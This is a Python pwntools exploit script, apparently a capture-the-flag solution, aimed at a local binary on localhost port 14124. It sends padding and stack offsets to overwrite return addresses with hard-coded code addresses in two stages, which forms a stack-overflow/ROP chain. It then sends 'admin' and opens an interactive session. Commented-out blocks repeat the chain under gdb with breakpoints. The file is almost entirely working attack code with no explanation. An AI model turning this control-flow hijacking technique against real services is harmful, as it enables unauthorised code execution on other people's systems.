


from pwn import *


offset = 0x7ffd2fa9cbc8 - 0x7ffd2fa9cb50

offset2 = 0x00007fff9054e5d8 - 0x7fff9054e500

# 0x7fff9054e500


with remote('localhost',14124) as p:
    time.sleep(0.1)
    p.recv()

    for i in range(13):
        p.send(chr(ord('a') + i).encode() * 8);
    p.send(b'AAAA' + p32(offset - 8));
    p.send(p64(0x004011f4));
    #p.send(b'B' * 8);

    p.recv()

    for i in range(10):
        p.send(chr(ord('a') + i).encode() * 8);
    p.send(p64(0x404070));
    p.send(p64(0x40122e));
    p.send(b'B' * 8);
    p.send(b'AAAA' + p32(offset2 - 8));
    p.send(p64(0x00401160));

    p.recv()

    p.send(b'admin\x00\x00\x00')

    print(p.recv())

    p.interactive()

"""
with gdb.debug('./a.out', gdbscript='', api=True) as p:
    #p.gdb.Breakpoint("*main+95", temporary=False);
    #p.gdb.Breakpoint("*vuln+98", temporary=False);
    p.gdb.Breakpoint("*vuln+80", temporary=False); # last read
    #p.gdb.Breakpoint("*vuln+108", temporary=False); # ret
    #p.gdb.Breakpoint("*vuln+107", temporary=False); # pop rbp

    p.gdb.continue_nowait()

    print(p.recv())

    for i in range(13):
        p.send(chr(ord('a') + i).encode() * 8);
    p.send(b'AAAA' + p32(offset - 8));
    p.send(p64(0x004011f4));
    #p.send(b'B' * 8);

    p.recv()

    for i in range(10):
        p.send(chr(ord('a') + i).encode() * 8);
    p.send(p64(0x404070));
    p.send(p64(0x40122e));
    p.send(b'B' * 8);
    p.send(b'AAAA' + p32(offset2 - 8));
    p.send(p64(0x00401160));

    p.recv()

    p.send(b'admin\x00\x00\x00')

    p.recv()


    p.gdb.wait()

    p.interactive()
"""

"""
for i in range(13):
    p.send(chr(ord('a') + i).encode() * 8);
p.send(b'AAAA' + p32(offset - 8));
p.send(p64(0x0000000000401214));
#p.send(b'B' * 8);
"""
